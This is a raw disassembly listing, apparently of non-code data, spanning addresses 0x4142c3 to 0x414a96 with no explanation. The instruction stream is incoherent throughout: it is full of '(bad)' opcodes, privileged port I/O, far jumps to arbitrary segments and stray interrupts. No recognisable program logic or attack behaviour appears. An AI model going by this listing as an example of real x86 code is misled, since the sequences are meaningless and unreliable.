  4142c3:	(bad)  
  4142c4:	sbb    eax,0x87182c62
  4142c9:	ror    DWORD PTR [eax+0x1d],0xfb
  4142cd:	leave  
  4142ce:	out    dx,eax
  4142cf:	xchg   DWORD PTR [ebp+0x281e15d6],ecx
  4142d5:	cmc    
  4142d6:	(bad)  
  4142d7:	pop    eax
  4142d8:	pop    esi
  4142d9:	in     al,dx
  4142da:	popa   
  4142db:	or     eax,0xbdaf1093
  4142e0:	mov    ecx,DWORD PTR [ebp+0x6145ca89]
  4142e6:	in     eax,dx
  4142e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142e8:	jno    0x4142ab
  4142ea:	sbb    BYTE PTR [ebp+esi*2-0x3e6cf67c],al
  4142f1:	ins    BYTE PTR es:[edi],dx
  4142f2:	and    eax,0x6f19d8f0
  4142f7:	push   edx
  4142f8:	daa    
  4142f9:	xor    BYTE PTR [esi+0x332cf8ca],ch
  4142ff:	(bad)  
  414300:	push   edi
  414301:	imul   esi,DWORD PTR [edx],0xe2f449f7
  414307:	repnz and DWORD PTR [edx-0x423479c9],eax
  41430e:	aam    0xd7
  414310:	ja     0x4142aa
  414312:	test   eax,edi
  414314:	mov    ebx,0xaa216fec
  414319:	jmp    0x8fe60b76
  41431e:	push   ss
  41431f:	cld    
  414320:	inc    ebp
  414321:	aam    0xfe
  414323:	imul   esi,esp,0x65
  414326:	dec    ebx
  414327:	xchg   ecx,eax
  414328:	clc    
  414329:	fsub   st,st(3)
  41432b:	gs loop 0x414388
  41432e:	ja     0x414337
  414330:	sub    BYTE PTR [edx+0x1ea76de4],al
  414336:	call   0x67c0:0x61808e13
  41433d:	push   ss
  41433e:	rcl    BYTE PTR [ebx-0x6197a27a],cl
  414344:	rcl    edx,0x13
  414347:	xor    al,0xdb
  414349:	dec    esi
  41434a:	push   0xffffffdb
  41434c:	aas    
  41434d:	push   eax
  41434e:	jecxz  0x4142fd
  414350:	gs out 0x4e,al
  414353:	jecxz  0x41432a
  414355:	jg     0x414386
  414357:	or     eax,0xfaaf724b
  41435c:	std    
  41435d:	int    0x7d
  41435f:	aaa    
  414360:	jnp    0x41438f
  414362:	pop    eax
  414363:	retf   0xd8e6
  414366:	icebp  
  414367:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414368:	push   ebx
  414369:	jns    0x414349
  41436b:	sbb    DWORD PTR fs:[edx-0x73985f81],0x47b0d58
  414376:	cli    
  414377:	(bad)  
  414378:	xchg   esi,eax
  414379:	fdivr  DWORD PTR [ecx+eax*2-0x3285e114]
  414380:	loopne 0x414375
  414382:	xor    ch,0x2e
  414385:	jbe    0x41436d
  414387:	(bad)  
  414388:	shl    BYTE PTR [esi+0x53ad3dfc],0xbc
  41438f:	pop    es
  414390:	jge    0x4143f2
  414392:	(bad)  
  414393:	aas    
  414394:	lds    esp,FWORD PTR [edi+0x18]
  414397:	(bad)
  41439b:	aas    
  41439c:	nop
  41439d:	adc    DWORD PTR [edi],edi
  41439f:	pop    ss
  4143a0:	adc    DWORD PTR [edi-0x1],esp
  4143a3:	mov    edi,0x31c66464
  4143a8:	mov    al,0x5c
  4143aa:	jb     0x414376
  4143ac:	outs   dx,BYTE PTR ds:[esi]
  4143ad:	shl    DWORD PTR [ebx],0xc6
  4143b0:	pop    ebp
  4143b1:	xlat   BYTE PTR ds:[ebx]
  4143b2:	mov    al,ds:0x7c0e6040
  4143b7:	jno    0x4143fc
  4143b9:	in     eax,dx
  4143ba:	add    ah,BYTE PTR [edx]
  4143bc:	test   eax,0x86dcf16c
  4143c1:	xchg   ebp,eax
  4143c2:	jnp    0x4143aa
  4143c4:	and    cl,BYTE PTR [edx]
  4143c6:	adc    dl,BYTE PTR ss:[ecx+0x22648e7c]
  4143cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143ce:	imul   ebp,DWORD PTR ds:0xa9c5707d,0xffffffda
  4143d5:	icebp  
  4143d6:	or     ecx,DWORD PTR [edx+eiz*2+0x65c20e4d]
  4143dd:	or     eax,0x5a09658d
  4143e2:	sbb    BYTE PTR [edx-0x37],dl
  4143e5:	call   0xab7fc785
  4143ea:	out    0x9d,al
  4143ec:	cmc    
  4143ed:	fistp  WORD PTR [esi+0x66]
  4143f0:	add    al,0x54
  4143f2:	add    eax,0x2f2bf953
  4143f7:	mov    ah,0x90
  4143f9:	jecxz  0x414387
  4143fb:	xor    al,BYTE PTR [edx]
  4143fd:	xchg   ebp,ebp
  4143ff:	repz popa 
  414401:	pop    ebx
  414402:	enter  0xeb59,0x35
  414406:	aas    
  414407:	and    al,0xde
  414409:	sub    BYTE PTR [esi],bl
  41440b:	(bad)  
  41440c:	int    0x33
  41440e:	dec    esp
  41440f:	inc    esi
  414410:	mov    BYTE PTR [ecx+0x6cfbb0af],al
  414416:	mov    edx,0xaa959826
  41441b:	popa   
  41441c:	rcl    BYTE PTR [eax-0x61c2ae3f],cl
  414422:	stos   BYTE PTR es:[edi],al
  414423:	aas    
  414424:	pop    ecx
  414425:	into   
  414426:	fbld   TBYTE PTR [eax]
  414428:	pop    edi
  414429:	sbb    DWORD PTR [ecx+edx*4+0x13],esi
  41442d:	loop   0x41445b
  41442f:	xchg   ebp,eax
  414430:	sub    eax,0x96aa8458
  414435:	cmc    
  414436:	fld    QWORD PTR [ecx-0x19a44fac]
  41443c:	dec    ebx
  41443d:	inc    esp
  41443e:	push   ecx
  41443f:	jb     0x41444e
  414441:	sub    al,0x63
  414443:	push   0xdfb80c2b
  414448:	popf   
  414449:	xlat   BYTE PTR ds:[ebx]
  41444a:	fsub   DWORD PTR [ebp+0x3c]
  41444d:	jb     0x41440d
  41444f:	xchg   esp,eax
  414450:	cmp    bl,BYTE PTR [esi-0xfbfab4d]
  414456:	fs add esp,eax
  414459:	jmp    0xfef2:0x1198dfe0
  414460:	push   esi
  414461:	in     eax,dx
  414462:	push   esi
  414463:	add    DWORD PTR [ebx+ecx*1-0x25],esp
  414467:	aas    
  414468:	ins    DWORD PTR es:[edi],dx
  414469:	loope  0x414407
  41446b:	pop    edx
  41446c:	cld    
  41446d:	aam    0x85
  41446f:	dec    edi
  414470:	outs   dx,BYTE PTR ds:[esi]
  414471:	sub    BYTE PTR [ebp+0x46c7e115],dh
  414477:	xchg   ah,cl
  414479:	rcr    BYTE PTR [esi],1
  41447b:	out    dx,eax
  41447c:	and    al,BYTE PTR [esi]
  41447e:	jae    0x4144a0
  414480:	or     al,0xdc
  414482:	out    0x37,al
  414484:	xor    eax,0x198910b
  414489:	jmp    0x6cee:0x95e09b6
  414490:	mov    edi,0x6e093b52
  414495:	adc    eax,0xe5017183
  41449a:	scas   eax,DWORD PTR es:[edi]
  41449b:	add    DWORD PTR [edi-0x9],edi
  41449e:	dec    edx
  41449f:	test   DWORD PTR [edx],esi
  4144a1:	inc    ebp
  4144a2:	test   DWORD PTR [ebp+0x4a5ff64c],esp
  4144a8:	cmp    edx,DWORD PTR [ecx]
  4144aa:	mov    ebp,0x42393f15
  4144af:	fmul   QWORD PTR [edi+0x1e3aa54d]
  4144b5:	aad    0xaa
  4144b7:	jbe    0x41452c
  4144b9:	mov    ds:0xbc5b28c3,al
  4144be:	cmp    DWORD PTR [ebp+0x7f3813bf],ecx
  4144c4:	int3   
  4144c5:	nop
  4144c6:	call   0x91e3:0xe6ea01f1
  4144cd:	test   eax,0xe343da62
  4144d2:	or     eax,DWORD PTR [edi+0x58]
  4144d5:	retf   
  4144d6:	test   BYTE PTR [edi+0x63],dl
  4144d9:	push   es
  4144da:	(bad)  
  4144db:	ins    BYTE PTR es:[edi],dx
  4144dc:	(bad)  
  4144dd:	jmp    0x571f:0xa20ded7a
  4144e4:	dec    ebx
  4144e5:	cmp    dh,dl
  4144e7:	xchg   esp,eax
  4144e8:	or     DWORD PTR [edx],ebp
  4144ea:	xchg   ebp,eax
  4144eb:	popf   
  4144ec:	lods   al,BYTE PTR ds:[esi]
  4144ed:	adc    eax,0xd141645e
  4144f2:	or     ch,al
  4144f4:	or     ch,BYTE PTR [eax+0x1dde743c]
  4144fa:	xchg   ebp,eax
  4144fb:	mov    BYTE PTR [esi-0x4068a3fa],bl
  414501:	popf   
  414502:	mov    ebx,0x825b8a78
  414507:	mov    edi,0xa10b23e1
  41450c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41450d:	aad    0x1
  41450f:	repz sar BYTE PTR [ebx-0x1409be7d],cl
  414516:	jb     0x414518
  414518:	mov    WORD PTR [ebx+0x2d],gs
  41451b:	adc    edx,DWORD PTR [ecx-0xc]
  41451e:	shl    DWORD PTR [eax+0x59a2c3f3],0xf1
  414525:	and    dl,BYTE PTR [edi-0x300e8bf2]
  41452b:	or     edi,ebx
  41452d:	scas   eax,DWORD PTR es:[edi]
  41452e:	push   ss
  41452f:	xor    al,0x6d
  414531:	pop    ds
  414532:	adc    dh,BYTE PTR [edi]
  414534:	mov    edi,DWORD PTR [ecx-0x2ac6f4a0]
  41453a:	push   0xffffffca
  41453c:	xlat   BYTE PTR ds:[ebx]
  41453d:	sahf   
  41453e:	test   BYTE PTR [eax],ah
  414540:	loop   0x414577
  414542:	jecxz  0x4145a5
  414544:	pop    edi
  414545:	jle    0x4144f6
  414547:	push   ebp
  414548:	mov    cs,WORD PTR [ebx+0x25a6ee12]
  41454e:	adc    BYTE PTR [ebx],dh
  414550:	xlat   BYTE PTR ds:[ebx]
  414551:	enter  0xa079,0x43
  414555:	inc    ecx
  414556:	aas    
  414557:	loopne 0x4145af
  414559:	lahf   
  41455a:	jge    0x414591
  41455c:	mov    ebp,0xc13e130a
  414561:	or     BYTE PTR [ebx],0xcf
  414564:	std    
  414565:	mov    edi,0x775f1cd8
  41456a:	bound  ebx,QWORD PTR ds:0xa4eaccee
  414570:	or     BYTE PTR [eax-0x3e],bl
  414573:	ds (bad) 
  414575:	mov    eax,ds:0xdeee3efb
  41457a:	cmp    bh,0xcc
  41457d:	cmp    DWORD PTR [ebx+0x56da3d80],ebp
  414583:	addr16 push edi
  414585:	or     BYTE PTR [eax],dl
  414587:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414588:	rcl    DWORD PTR [ecx+ecx*1-0x21cdf534],cl
  41458f:	mov    ebp,0x4dc76b13
  414594:	loope  0x41456b
  414596:	ror    BYTE PTR [ebp+0x45],1
  414599:	jg     0x414605
  41459b:	int    0x68
  41459d:	jle    0x41459f
  41459f:	jb     0x414522
  4145a1:	push   ecx
  4145a2:	pop    esp
  4145a3:	loop   0x4145b9
  4145a5:	xchg   esi,eax
  4145a6:	sbb    DWORD PTR [esi+ebp*8],ecx
  4145a9:	int3   
  4145aa:	pop    ebx
  4145ab:	jb     0x414589
  4145ad:	daa    
  4145ae:	inc    eax
  4145af:	dec    ebp
  4145b0:	adc    eax,0xe3759b32
  4145b5:	inc    ebp
  4145b6:	jecxz  0x41460d
  4145b8:	out    0xb0,eax
  4145ba:	out    0x32,al
  4145bc:	jmp    0x4145fa
  4145be:	pop    edi
  4145bf:	mov    ch,0x1e
  4145c1:	cwde   
  4145c2:	retf   
  4145c3:	call   0x5d9d:0xa61576d4
  4145ca:	gs add eax,0xbbb4b983
  4145d0:	outs   dx,DWORD PTR ds:[esi]
  4145d1:	out    dx,eax
  4145d2:	sar    BYTE PTR [edx+0x17],cl
  4145d5:	daa    
  4145d6:	jle    0x472797a2
  4145dc:	cs sub al,0x57
  4145df:	sbb    bh,BYTE PTR [edx+0x5]
  4145e2:	and    DWORD PTR [ecx],edi
  4145e4:	cwde   
  4145e5:	fcmove st,st(1)
  4145e7:	cs pusha 
  4145e9:	dec    edi
  4145ea:	xlat   BYTE PTR ds:[ebx]
  4145eb:	mov    ebp,0x9b5c9ec4
  4145f0:	jmp    0x4e29546f
  4145f5:	in     eax,dx
  4145f6:	mov    bh,BYTE PTR [edx-0x53097041]
  4145fc:	dec    ecx
  4145fd:	jne    0x4145e1
  4145ff:	xchg   ecx,eax
  414600:	shl    BYTE PTR [ebx+0x64],0xe2
  414604:	mov    eax,ds:0xb062fd6
  414609:	loop   0x4145b4
  41460b:	aad    0x51
  41460d:	xor    al,0x4e
  41460f:	cld    
  414610:	rol    BYTE PTR [ebx],1
  414612:	in     eax,dx
  414613:	jnp    0x414625
  414615:	xchg   ebx,eax
  414616:	lods   al,BYTE PTR ds:[esi]
  414617:	pop    ss
  414618:	sub    eax,0x858441b
  41461d:	sub    bl,BYTE PTR [eax+0x60]
  414620:	mov    ds:0x3a220b40,eax
  414625:	mov    esp,0xb76b8ca1
  41462a:	xor    ebx,DWORD PTR [edi-0x315865b0]
  414630:	push   ss
  414631:	xor    dh,BYTE PTR [ecx]
  414633:	test   eax,0x8b912364
  414638:	in     al,0x53
  41463a:	into   
  41463b:	mov    WORD PTR [ebp-0x6a],gs
  41463e:	test   dl,0xbb
  414641:	adc    DWORD PTR [edx+0x7a],edx
  414644:	push   esi
  414645:	not    DWORD PTR [esi]
  414647:	jmp    0x4146ac
  414649:	call   0xaf5b:0xfa3107f
  414650:	cmp    dh,al
  414652:	push   cs
  414653:	adc    eax,0xc187e65b
  414658:	sbb    dl,ah
  41465a:	adc    dl,BYTE PTR [eax+0x3aa0a970]
  414660:	cmp    BYTE PTR [edx+0x28],cl
  414663:	loopne 0x414650
  414665:	ss jb  0x414640
  414668:	bound  ecx,QWORD PTR [esi+edx*1-0x68]
  41466c:	or     ch,BYTE PTR [ebp+0x149df09e]
  414672:	cld    
  414673:	mov    ebp,0x5d97f28a
  414678:	mov    al,0x92
  41467a:	mov    dl,0x59
  41467c:	enter  0x2d9a,0x1f
  414680:	loop   0x4146fe
  414682:	js     0x414673
  414684:	push   ss
  414685:	shl    dh,0x4a
  414688:	iret   
  414689:	cli    
  41468a:	sbb    DWORD PTR [ebp+0x2d],eax
  41468d:	test   DWORD PTR [edi-0x60],0x95d797b7
  414694:	xor    al,0x50
  414696:	in     al,dx
  414697:	inc    eax
  414698:	lock idiv DWORD PTR [esi]
  41469b:	mov    fs,edi
  41469d:	jne    0x414629
  41469f:	stc    
  4146a0:	test   DWORD PTR [edx],esp
  4146a2:	pop    es
  4146a3:	push   0xffffff97
  4146a5:	jno    0x41467e
  4146a7:	iret   
  4146a8:	mov    ebx,0x482f557d
  4146ad:	cmp    BYTE PTR [esi-0x71],cl
  4146b0:	imul   DWORD PTR [esp+ecx*4]
  4146b3:	or     ebp,esi
  4146b5:	mov    edx,0x9be02d9a
  4146ba:	xchg   ebx,eax
  4146bb:	fwait
  4146bc:	les    eax,FWORD PTR [ebx]
  4146be:	stos   BYTE PTR es:[edi],al
  4146bf:	push   ds
  4146c0:	jg     0x4146fd
  4146c2:	xor    al,0xed
  4146c4:	xlat   BYTE PTR ds:[ebx]
  4146c5:	push   es
  4146c6:	jle    0x4146c6
  4146c8:	push   es
  4146c9:	inc    ebx
  4146ca:	mov    ch,0x9
  4146cc:	push   cs
  4146cd:	fisub  WORD PTR [edx]
  4146cf:	mov    eax,ds:0x2a1901d5
  4146d4:	ret    
  4146d5:	inc    edx
  4146d6:	int3   
  4146d7:	add    eax,0x6bbec594
  4146dc:	inc    edx
  4146dd:	sub    edx,ebp
  4146df:	and    BYTE PTR [edx+0x375cc8f7],bl
  4146e5:	add    esp,DWORD PTR [edx+0x21c5773b]
  4146eb:	add    dl,dl
  4146ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146ee:	aas    
  4146ef:	push   edx
  4146f0:	cmp    esp,DWORD PTR [ecx+ebp*4+0x1a]
  4146f4:	push   ecx
  4146f5:	(bad)  
  4146f6:	loopne 0x41469a
  4146f8:	adc    dh,dh
  4146fa:	sub    dh,cl
  4146fc:	xor    bh,BYTE PTR [edx+eiz*1-0x55]
  414700:	and    ecx,edi
  414702:	add    eax,0xefa1864d
  414707:	adc    bl,BYTE PTR [edi+0x6bab0e64]
  41470d:	cmp    eax,0x11ad829d
  414712:	daa    
  414713:	xor    DWORD PTR [edx+0x61],ebp
  414716:	xor    al,0xeb
  414718:	popa   
  414719:	mov    ?,WORD PTR [ebp+0x66]
  41471c:	push   ebp
  41471d:	pop    ebx
  41471e:	inc    esp
  41471f:	xor    ebx,ebp
  414721:	lods   al,BYTE PTR ds:[esi]
  414722:	dec    ebx
  414723:	daa    
  414724:	add    eax,0xb5b840e1
  414729:	or     al,0x2d
  41472b:	push   0x4e
  41472d:	ret    0x2cfd
  414730:	push   ebx
  414731:	bound  edx,QWORD PTR [edx]
  414733:	mov    BYTE PTR [ebx+0x784be53a],al
  414739:	ss int3 
  41473b:	inc    eax
  41473c:	adc    dl,BYTE PTR [ebp+0x21218919]
  414742:	jge    0x4146d3
  414744:	fucomip st,st(0)
  414746:	or     BYTE PTR [eax],0x30
  414749:	mov    ds:0x161f47ea,al
  41474e:	out    dx,al
  41474f:	cmc    
  414750:	xchg   edx,eax
  414751:	pop    esp
  414752:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414753:	push   eax
  414754:	pop    esi
  414755:	jle    0x4146f4
  414757:	into   
  414758:	xchg   edx,eax
  414759:	jl     0x4147c9
  41475b:	sub    ebp,DWORD PTR [eax*1+0x75425714]
  414762:	cmp    cl,BYTE PTR [eax]
  414764:	out    dx,eax
  414765:	xchg   ebx,eax
  414766:	inc    ecx
  414767:	mov    esi,DWORD PTR [edi+0x34]
  41476a:	mov    edx,0xbb756ac
  41476f:	xor    ebx,DWORD PTR [ebp-0x43539764]
  414775:	jno    0x41470e
  414777:	fisttp QWORD PTR [esp+ecx*2]
  41477a:	jnp    0x4147bf
  41477c:	sar    BYTE PTR [ebx+0x49],cl
  41477f:	int3   
  414780:	xchg   edx,eax
  414781:	int    0xfb
  414783:	add    al,BYTE PTR [ebx+esi*8-0x43]
  414787:	popf   
  414788:	lods   al,BYTE PTR ds:[esi]
  414789:	scas   eax,DWORD PTR es:[edi]
  41478a:	imul   ecx,DWORD PTR cs:[ebx+0x53],0x1e
  41478f:	inc    ebp
  414790:	adc    bh,BYTE PTR [ecx+0x3d3a9e48]
  414796:	(bad)  
  414797:	cmc    
  414798:	int    0x88
  41479a:	sub    DWORD PTR [ebx-0x7b],edi
  41479d:	popf   
  41479e:	loope  0x4147a4
  4147a0:	and    edx,eax
  4147a2:	mov    bh,0x68
  4147a4:	fwait
  4147a5:	pop    esp
  4147a6:	sbb    DWORD PTR [ebx+0x30],ebp
  4147a9:	lods   al,BYTE PTR ds:[esi]
  4147aa:	in     eax,dx
  4147ab:	rcr    DWORD PTR [edx],cl
  4147ad:	in     al,dx
  4147ae:	push   edi
  4147af:	bound  ebp,QWORD PTR [ecx]
  4147b1:	out    0x4,eax
  4147b3:	jmp    0x414828
  4147b5:	mov    ch,0x70
  4147b7:	outs   dx,DWORD PTR ds:[esi]
  4147b8:	sub    bh,dl
  4147ba:	aas    
  4147bb:	mov    esi,0x5d65cfda
  4147c0:	into   
  4147c1:	jns    0x4147f1
  4147c3:	sub    BYTE PTR [ebx+0x53c82295],cl
  4147c9:	fcmovnu st,st(6)
  4147cb:	xchg   esi,eax
  4147cc:	outs   dx,BYTE PTR ds:[esi]
  4147cd:	cs test al,0x52
  4147d0:	in     eax,0xe0
  4147d2:	mov    ds,esp
  4147d4:	into   
  4147d5:	jp     0x414819
  4147d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147d8:	ror    DWORD PTR [ebx],cl
  4147da:	call   0xec113053
  4147df:	sbb    eax,0xf9794f2f
  4147e4:	(bad)  
  4147e5:	pusha  
  4147e6:	imul   edi,ebx,0x12ee6ab8
  4147ec:	adc    BYTE PTR [eax+0x137ed5fe],dl
  4147f2:	in     eax,0xce
  4147f4:	mov    ebp,0xf13bdd48
  4147f9:	jmp    0xf1a48065
  4147fe:	cmp    al,0x83
  414800:	jp     0x4147be
  414802:	pop    ebp
  414803:	dec    ebp
  414804:	div    DWORD PTR [eax+eiz*8+0x38]
  414808:	xor    eax,DWORD PTR [ebp-0x6739877d]
  41480e:	pop    ds
  41480f:	xor    al,0xf1
  414811:	and    ebx,DWORD PTR [ecx-0x5f8ae7fa]
  414817:	ins    BYTE PTR es:[edi],dx
  414818:	jns    0x4147d8
  41481a:	lock in eax,dx
  41481c:	lahf   
  41481d:	pop    edx
  41481e:	xchg   esp,eax
  41481f:	pop    es
  414820:	sbb    al,0x54
  414822:	mov    ebp,0x197f14f0
  414827:	dec    esp
  414828:	(bad)  
  41482a:	add    eax,0xb4808fc6
  41482f:	push   cs
  414830:	js     0x41488b
  414832:	add    bl,BYTE PTR ds:0x99dfbd2d
  414838:	inc    ebp
  414839:	push   cs
  41483a:	pusha  
  41483b:	in     al,0x53
  41483d:	rcl    bh,0xad
  414840:	sub    BYTE PTR ds:0xe877aab9,dl
  414846:	jle    0x4147c8
  414848:	cmp    eax,DWORD PTR [edx+0x53]
  41484b:	or     eax,0x93b3cf07
  414850:	nop
  414851:	dec    ebx
  414852:	jnp    0x41489e
  414854:	xor    DWORD PTR [edx+0x36d4dec4],eax
  41485a:	mov    ebp,0xd9bb297a
  41485f:	xchg   ebp,eax
  414860:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414861:	mov    ?,WORD PTR [eax+ecx*1-0x17a1f044]
  414868:	add    esi,edi
  41486a:	les    ebp,FWORD PTR [edx]
  41486c:	sbb    eax,0x3ee826e9
  414871:	or     eax,0x77fcba2f
  414876:	shl    DWORD PTR [edx+0x69],0x21
  41487a:	cmp    al,0x8d
  41487c:	jb     0x41480f
  41487e:	test   BYTE PTR [esi],0x13
  414881:	sub    al,0xd1
  414883:	push   edx
  414884:	mov    ds,ecx
  414886:	inc    ebp
  414887:	xchg   ebp,eax
  414888:	sti    
  414889:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41488a:	mov    esp,0x7802daa2
  41488f:	fcomp  st(7)
  414891:	inc    eax
  414892:	test   BYTE PTR [eax],ah
  414894:	cs mov esi,0xc4cde038
  41489a:	xor    eax,0x5216d3c2
  41489f:	fisubr WORD PTR [ebx+0x61]
  4148a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148a3:	stos   BYTE PTR es:[edi],al
  4148a4:	pop    ebp
  4148a5:	pop    edx
  4148a6:	add    DWORD PTR [eax+ecx*4],eax
  4148a9:	sub    BYTE PTR [ebx-0x453dbfda],0x8c
  4148b0:	jo     0x4148f5
  4148b2:	or     eax,0xb74a8e7d
  4148b7:	call   0x7f2c:0xcda8ff91
  4148be:	imul   eax,DWORD PTR [eax-0x2b454306],0x5f
  4148c5:	sar    ah,0xab
  4148c8:	xchg   esp,eax
  4148c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148ca:	xchg   esp,eax
  4148cb:	hlt    
  4148cc:	mov    cl,0xdd
  4148ce:	mov    BYTE PTR [edi],bl
  4148d0:	jg     0x41485f
  4148d2:	test   BYTE PTR [ecx+0x237b30ab],cl
  4148d8:	retf   0x2c5d
  4148db:	in     al,dx
  4148dc:	outs   dx,BYTE PTR ds:[esi]
  4148dd:	lods   al,BYTE PTR ds:[esi]
  4148de:	xor    BYTE PTR [esi],bh
  4148e0:	ret    
  4148e1:	push   es
  4148e2:	xchg   ebp,eax
  4148e3:	add    DWORD PTR [esi+0x6150684a],ebp
  4148e9:	cmc    
  4148ea:	ss xchg esi,eax
  4148ec:	jne    0x414924
  4148ee:	aam    0x20
  4148f0:	dec    eax
  4148f1:	arpl   WORD PTR [ebx-0x16],si
  4148f4:	pop    esp
  4148f5:	mov    dh,0xb5
  4148f7:	popf   
  4148f8:	lods   al,BYTE PTR ds:[esi]
  4148f9:	hlt    
  4148fa:	daa    
  4148fb:	pushf  
  4148fc:	pop    esp
  4148fd:	jge    0x41488b
  4148ff:	jns    0x4148d4
  414901:	cdq    
  414902:	cmp    dl,BYTE PTR [ebx+0x41791ba6]
  414908:	push   0x1e06c89
  41490d:	sub    al,0x92
  41490f:	jne    0x41489a
  414911:	jns    0x414918
  414913:	int    0x96
  414915:	pop    esp
  414916:	pushf  
  414917:	add    BYTE PTR [ebx],0xfa
  41491a:	enter  0x54e3,0xb1
  41491e:	aaa    
  41491f:	xlat   BYTE PTR ds:[ebx]
  414920:	inc    ebp
  414921:	mov    ecx,0x8a3d6be7
  414926:	ror    bl,0x8e
  414929:	shl    eax,1
  41492b:	fcomp  QWORD PTR [esi+0x4ba4f77e]
  414931:	adc    BYTE PTR [eax],cl
  414933:	ret    0xe45d
  414936:	out    dx,al
  414937:	jb     0x414965
  414939:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41493a:	or     DWORD PTR ds:0x748bfdd2,edi
  414940:	popa   
  414941:	cmc    
  414942:	pop    DWORD PTR [edi-0x1034eedc]
  414948:	or     eax,0x194a180b
  41494d:	jmp    0x4864efc1
  414952:	dec    ebp
  414953:	fidiv  WORD PTR [ebp+0x6ea1c830]
  414959:	adc    eax,0xaa0c8c94
  41495e:	aad    0x28
  414960:	pop    ebp
  414961:	xor    bh,dl
  414963:	fild   DWORD PTR [ebp+0x7f]
  414966:	jle    0x4149c1
  414968:	sbb    BYTE PTR [ebx+0x265b671b],cl
  41496e:	cmp    bh,BYTE PTR [edx+0x17]
  414971:	shl    DWORD PTR [ebp-0x4851e289],1
  414977:	iret   
  414978:	cmc    
  414979:	fucom  st(3)
  41497b:	test   eax,0xd16b5f2c
  414980:	loop   0x414990
  414982:	inc    ecx
  414983:	mov    ah,0x13
  414985:	shr    BYTE PTR [ecx+eiz*1+0x1c],0x1b
  41498a:	add    bl,al
  41498c:	push   esi
  41498d:	jne    0x41491c
  41498f:	inc    eax
  414990:	js     0x4149fd
  414992:	ja     0x414967
  414994:	iret   
  414995:	loope  0x414983
  414997:	inc    ebx
  414998:	cmp    eax,0x746ff94d
  41499d:	rcr    DWORD PTR [ecx*1-0x67228240],1
  4149a4:	sub    DWORD PTR [edi+0x697799e0],edi
  4149aa:	jg     0x4149d8
  4149ac:	fcom   DWORD PTR [esi]
  4149ae:	jmp    0x4149bf
  4149b0:	mov    cl,0x70
  4149b2:	cmp    edx,DWORD PTR [edi+edi*1-0x2c1a51d3]
  4149b9:	mov    ah,BYTE PTR [esi]
  4149bb:	scas   eax,DWORD PTR es:[edi]
  4149bc:	call   0x2a1c:0x55278277
  4149c3:	cmp    eax,0xdb9f930
  4149c8:	dec    ecx
  4149c9:	test   edi,edi
  4149cb:	loope  0x4149d5
  4149cd:	jno    0x414a0b
  4149cf:	jg     0x4149d8
  4149d1:	test   BYTE PTR [edi+0x49],al
  4149d4:	(bad)  
  4149d5:	stc    
  4149d6:	popf   
  4149d7:	lods   eax,DWORD PTR ds:[esi]
  4149d8:	mov    esp,0x51336d63
  4149dd:	shl    ah,0xb8
  4149e0:	pushf  
  4149e1:	jns    0x4149bb
  4149e3:	in     al,dx
  4149e4:	jge    0x4149c9
  4149e6:	xchg   edi,eax
  4149e7:	sbb    edx,DWORD PTR [ebp+0x2]
  4149ea:	outs   dx,DWORD PTR ds:[esi]
  4149eb:	call   0x318c457f
  4149f0:	(bad)  
  4149f2:	sahf   
  4149f3:	push   0x7f
  4149f5:	icebp  
  4149f6:	cwde   
  4149f7:	xor    dh,BYTE PTR [ecx]
  4149f9:	(bad)  
  4149fb:	jns    0x41499a
  4149fd:	add    dh,BYTE PTR [ecx-0x56]
  414a00:	dec    ebx
  414a01:	and    DWORD PTR [ebp-0x43],esp
  414a04:	pop    es
  414a05:	aad    0x86
  414a07:	pop    esi
  414a08:	dec    edi
  414a09:	mov    ds:0x5ecde4df,al
  414a0e:	leave  
  414a0f:	xchg   esi,eax
  414a10:	add    eax,0x8d93e3b3
  414a15:	in     eax,dx
  414a16:	or     eax,0x41160c8b
  414a1b:	int    0x0
  414a1d:	mov    cl,ch
  414a1f:	and    ch,dl
  414a21:	inc    ecx
  414a22:	pop    esp
  414a23:	xor    DWORD PTR [edx+0x30],edi
  414a26:	push   ebx
  414a27:	pop    esi
  414a28:	jmp    0x4149e9
  414a2a:	mov    DWORD PTR [ecx-0x67],ebx
  414a2d:	push   0xffffff94
  414a2f:	sub    eax,0x3e1d2248
  414a34:	imul   esi,DWORD PTR [ebx-0x2cf487ca],0xd146b30f
  414a3e:	push   esi
  414a3f:	jnp    0x4149dc
  414a41:	mov    BYTE PTR [edx],al
  414a43:	into   
  414a44:	out    dx,eax
  414a45:	cmp    ecx,DWORD PTR [eax]
  414a47:	sbb    BYTE PTR [ebx],cl
  414a49:	mov    ah,0x38
  414a4b:	lahf   
  414a4c:	pop    ss
  414a4d:	mov    edx,DWORD PTR [esi+0x4bb09c6f]
  414a53:	neg    DWORD PTR [ecx+0x4a]
  414a56:	xor    ebx,edx
  414a58:	jb     0x414a7d
  414a5a:	mov    dh,0x81
  414a5c:	push   ss
  414a5d:	pop    ds
  414a5e:	sahf   
  414a5f:	(bad)  
  414a60:	fld    DWORD PTR [eax-0x658e76b8]
  414a66:	dec    esi
  414a67:	daa    
  414a68:	cmp    bl,ah
  414a6a:	out    dx,al
  414a6b:	mov    eax,DWORD PTR [ebx+0x33]
  414a6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a6f:	lahf   
  414a70:	and    al,0x43
  414a72:	int    0x78
  414a74:	pop    ebp
  414a75:	jns    0x414a98
  414a77:	mov    edx,0xa6950cde
  414a7c:	dec    ebx
  414a7d:	ins    BYTE PTR es:[edi],dx
  414a7e:	cmp    eax,0xccec0c3d
  414a83:	mov    edx,0xbc6e462e
  414a88:	sub    eax,0x5a5f170d
  414a8d:	loop   0x414a69
  414a8f:	fistp  QWORD PTR [esi]
  414a91:	cdq    
  414a92:	clc    
  414a93:	shl    eax,cl
  414a95:	popa   
  414a96:	fbstp  TBYTE PTR [edx+0x1]
